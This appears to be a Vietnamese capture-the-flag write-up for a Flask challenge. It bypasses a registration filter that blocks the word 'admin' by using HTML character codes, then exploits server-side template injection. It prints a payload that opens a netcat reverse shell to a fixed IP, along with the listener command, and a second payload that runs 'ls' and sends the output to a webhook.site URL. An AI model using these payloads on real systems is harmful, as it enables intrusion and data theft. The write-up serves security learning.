Bài này sử dụng jwt để render và tạo cookie.Dựa vào source code đi kèm,ta thấy không thể nào bypass được jwt,cookie chỉ có thể do server tạo ra.<b>
Mà server check dựa vào role là user hay admin,ở phần register,nếu ta điền role là admin sẽ bị chặn :<br> 
<a>
```
if "admin" in json_data:
        return jsonify(message="Blocked!")
```
</a>
Ta thấy server check một cách lỏng lẻo,nên ta sẽ bypass bằng cách dùng Unicode.

| Ký tự | Mã Unicode | Ký tự | Mã Unicode |
|-------|------------|-------|------------|
| (space) | `&#32;` | `@` | `&#64;` |
| `!` | `&#33;` | `A` | `&#65;` |
| `"` | `&#34;` | `B` | `&#66;` |
| `#` | `&#35;` | `C` | `&#67;` |
| `$` | `&#36;` | `D` | `&#68;` |
| `%` | `&#37;` | `E` | `&#69;` |
| `&` | `&#38;` | `F` | `&#70;` |
| `'` | `&#39;` | `G` | `&#71;` |
| `(` | `&#40;` | `H` | `&#72;` |
| `)` | `&#41;` | `I` | `&#73;` |
| `*` | `&#42;` | `J` | `&#74;` |
| `+` | `&#43;` | `K` | `&#75;` |
| `,` | `&#44;` | `L` | `&#76;` |
| `-` | `&#45;` | `M` | `&#77;` |
| `.` | `&#46;` | `N` | `&#78;` |
| `/` | `&#47;` | `O` | `&#79;` |
| `0` | `&#48;` | `P` | `&#80;` |
| `1` | `&#49;` | `Q` | `&#81;` |
| `2` | `&#50;` | `R` | `&#82;` |
| `3` | `&#51;` | `S` | `&#83;` |
| `4` | `&#52;` | `T` | `&#84;` |
| `5` | `&#53;` | `U` | `&#85;` |
| `6` | `&#54;` | `V` | `&#86;` |
| `7` | `&#55;` | `W` | `&#87;` |
| `8` | `&#56;` | `X` | `&#88;` |
| `9` | `&#57;` | `Y` | `&#89;` |
| `:` | `&#58;` | `Z` | `&#90;` |
| `;` | `&#59;` | `[` | `&#91;` |
| `<` | `&#60;` | `\` | `&#92;` |
| `=` | `&#61;` | `]` | `&#93;` |
| `>` | `&#62;` | `^` | `&#94;` |
| `?` | `&#63;` | `_` | `&#95;` |
| ``` ` ``` | `&#96;` | ``` ` ``` | `&#96;` |
| `a` | `&#97;` | `n` | `&#110;` |
| `b` | `&#98;` | `o` | `&#111;` |
| `c` | `&#99;` | `p` | `&#112;` |
| `d` | `&#100;` | `q` | `&#113;` |
| `e` | `&#101;` | `r` | `&#114;` |
| `f` | `&#102;` | `s` | `&#115;` |
| `g` | `&#103;` | `t` | `&#116;` |
| `h` | `&#104;` | `u` | `&#117;` |
| `i` | `&#105;` | `v` | `&#118;` |
| `j` | `&#106;` | `w` | `&#119;` |
| `k` | `&#107;` | `x` | `&#120;` |
| `l` | `&#108;` | `y` | `&#121;` |
| `m` | `&#109;` | `z` | `&#122;` |
| `{` | `&#123;` | `\|` | `&#124;` |
| `}` | `&#125;` | `~` | `&#126;` |

Sau khi bypass được check role,ta sẽ khai thác SSTI để tạo revert shell tại <a>`rendered_template = render_template_string(template)`</a> <br>
Payload: 
<a>`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('nc 172.26.97.248 9999 -e /bin/bash').read() }}
`</a> <br>
Lắng nghe port 9999 : `nc -lvnp 9999` <br>
Cách 2: <br>
Payload: <br>
<a>
```
{
  "template": "{{ url_for.__globals__['__builtins__']['__import__']('urllib2').urlopen('https://webhook.site/0139531b-9559-42d0-a71a-b43e039822c2/?flag=' + url_for.__globals__['os'].popen('ls').read()) }}"
}
```
</a> 
Có : <br>
<p> url_for :  Đây là một hàm phổ biến trong Flask dùng để tạo ra URL cho một endpoint cụ thể. </p>
<p> __globals__ : Đây là một thuộc tính của các hàm trong Python, chứa các biến toàn cục có sẵn trong phạm vi hàm đó. Khi gọi url_for.__globals__, ta truy cập được toàn bộ không gian toàn cục của Flask,
bao gồm các hàm, biến và module. </p>
<p> ['__builtins__'] : Đây là một mục trong __globals__, chứa các hàm và biến dựng sẵn của Python. </p>
<p>Trong Python, module builtins chứa rất nhiều hàm dựng sẵn. Các hàm này có thể được sử dụng mà không cần import vì chúng được tích hợp sẵn trong môi trường Python. <br>
Dưới đây là danh sách các hàm phổ biến trong builtins: </p>
        Hàm nhập xuất: <br>
print() :In dữ liệu ra màn hình. <br>
input() : Lấy dữ liệu đầu vào từ người dùng. <br>
open()  : Mở file. <br>
Hàm đặc biệt cho import và unload module: <br>
__import__() :Cho phép import một module mới hoặc lấy lại module đã được import vào bộ nhớ. <br>
Cách dùng __import__('module_name') có thể thay thế cho câu lệnh import module_name. <br>
        
      
